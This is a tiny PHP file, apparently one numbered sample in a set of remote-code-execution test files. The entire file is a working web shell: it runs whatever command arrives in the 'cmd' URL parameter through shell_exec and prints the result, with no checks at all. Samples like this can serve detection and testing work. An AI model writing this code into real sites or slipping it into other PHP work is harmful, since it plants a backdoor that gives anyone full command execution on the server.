<?php
// RCE test variation #1068
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>